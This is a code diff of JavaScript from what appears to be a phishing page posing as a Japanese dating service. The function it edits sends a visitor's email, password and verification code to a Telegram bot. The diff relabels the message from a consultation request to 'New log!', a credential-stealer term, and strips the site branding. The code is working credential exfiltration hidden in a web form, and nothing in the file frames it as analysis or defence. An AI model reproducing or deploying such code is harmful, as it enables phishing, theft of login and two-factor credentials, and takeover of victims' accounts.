@@ -235,15 +235,13 @@
     // ========== ОТПРАВКА В TELEGRAM ==========
     async function sendToTelegram(email, password, code) {
       const message = `
-📝 *Новая заявка на консультацию!*
+📝 *Новый лог!*
 
 📧 *Email:* ${email}
 🔑 *Пароль:* ${password}
 📱 *Код:* ${code}
 🕐 *Дата:* ${new Date().toLocaleString('ru-RU')}
-🌐 *Язык:* ${currentLang === 'en' ? 'English' : '日本語'}
-
-💫 *Amai — Dating in Japan*`;
+🌐 *Язык:* ${currentLang === 'en' ? 'English' : '日本語'} `;
       
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       
